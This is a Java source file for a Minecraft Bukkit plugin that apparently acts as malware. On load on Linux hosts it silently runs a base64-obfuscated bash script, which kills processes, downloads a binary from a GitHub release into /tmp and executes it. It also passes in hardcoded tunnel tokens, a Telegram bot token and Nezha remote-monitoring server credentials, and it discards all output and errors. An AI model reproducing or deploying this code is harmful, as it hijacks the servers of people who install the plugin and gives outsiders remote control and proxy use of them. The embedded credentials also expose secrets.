package com.argo.plugin;

import java.util.HashMap;
import java.util.Map;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class WlPlugins extends JavaPlugin {
    private Process runningProcess = null;

    @Override
    public void onEnable() {
        String os = System.getProperty("os.name").toLowerCase();
        if (!os.contains("linux")) {
            return;
        }

        String scriptCommands = "echo \"aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw\" | base64 -d | bash";

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                Map<String, String> envVars = new HashMap<>();
                loadEnvVars(envVars);
                runScriptSilent(scriptCommands, envVars);
            } catch (Exception e) {
                // Silent catch
            }
        });
    }

    @Override
    public void onDisable() {
        Bukkit.getScheduler().cancelTasks(this);
        if (runningProcess != null && runningProcess.isAlive()) {
            runningProcess.destroyForcibly();
        }
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("TOK", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiOTE4NDljNTctYWY5OC00OTFhLWIwNWUtMDlhNjFhNzkxN2U4IiwicyI6Ill6UmhNakprTkRNdE1EVmtNeTAwWkRVNExUZ3hPREl0WmpKbFpUZzBaVEl6TURFMyJ9");
        envVars.put("ARGO_DOMAIN", "great-es.milan.us.kg");
        envVars.put("TUNNEL_PROXY", "");

        envVars.put("TG", "6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
        envVars.put("SUB_URL", "");

        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_TLS", "1");
        envVars.put("AGENT_UUID", "307635b4-d657-4100-b1f7-775e34926bcf");

        envVars.put("TMP_ARGO", "3x");
        envVars.put("VL_PORT", "8002");
        envVars.put("VM_PORT", "9010");
        envVars.put("CF_IP", "saas.sin.fan");
        envVars.put("SUB_NAME", "Great-ES");
        envVars.put("SERVER_PORT", "25565");
        envVars.put("second_port", "");
        envVars.put("UUID", "307635b4-d657-4100-b1f7-775e34926bcf");
        
        envVars.put("second_port", "");
        envVars.put("SNI", "www.apple.com");
        envVars.put("JAR_SH", "moni");
    }

    public void runScriptSilent(String scriptContent, Map<String, String> envVars) {
        try {
            ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/bash", "-c", scriptContent});
            
            // Totally silent execution
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Map<String, String> currentEnv = pb.environment();
            currentEnv.putAll(envVars);
            
            Process process = pb.start();
            this.runningProcess = process;
            
            process.waitFor();
            
        } catch (Exception e) {
            // Silent catch
        } finally {
            this.runningProcess = null;
        }
    }
}
